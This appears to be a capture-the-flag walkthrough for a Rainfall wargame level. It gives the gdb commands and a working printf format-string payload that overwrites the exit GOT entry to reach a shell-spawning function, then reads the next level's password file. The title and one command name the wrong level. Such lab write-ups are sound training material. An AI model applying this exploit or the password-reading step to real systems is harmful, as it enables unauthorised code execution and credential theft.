# Rainfall - Level3 Walkthrough

We copy the file `/home/user/level5/level5` locally:

```bash
scp -P 4242 level5@{IP}:/home/user/level5/level5 .
```

**Step 1**
Open the binary in Ghidra.

**Step 2**
Looking at the code, we understand that we need to find a way to execute the `o` function which would result in a shell execution.

We previously learned that we can control printf to write a choosen value in a pointer of our choice.

We want to overwrite the pointer to the exit function to point to the function `o`.

**Step 3**
We search for the address of exit:
```bash
gdb ./level5
disas exit
```

> Dump of assembler code for function exit@plt:
>   0x080483d0 <+0>:	jmp    *0x8049838
>   0x080483d6 <+6>:	push   $0x28
>   0x080483db <+11>:	jmp    0x8048370

The address of `exit` we want to overwrite is `0x8049838`
The little endian version is \x38\x98\x04\x08

The addres of `o` is `0x080484a4`.
That gives 134513828 in decimal
The padding is 134513828 - 4 = 134513824

The offset in the format string:

```bash
./level4
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```
0x414141 (=AAAA) is found at the 4th position.

**Step 4**
We craft a the payload (exit_address_little_endian + padding_to_o_address + %4$n).

```bash
(python -c "print '\x38\x98\x04\x08' + '%134513824c' + '%4\$n'"; cat) | ./level5
cat /home/user/level6/.pass
```
